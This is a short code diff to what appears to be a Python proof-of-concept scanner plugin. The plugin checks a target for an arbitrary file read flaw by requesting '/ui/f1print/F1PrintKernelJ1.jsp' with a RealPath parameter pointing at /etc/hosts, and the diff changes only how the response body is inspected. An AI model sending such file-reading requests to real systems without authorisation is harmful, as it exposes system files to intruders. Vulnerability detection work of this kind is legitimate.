@@ -48,7 +48,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/ui/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts'
             response = requests.get(vul_url)
-            if response.status_code == 200 and '127.0.0.1' in response.content:
+            if response.status_code == 200 and '127.0.0.1' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
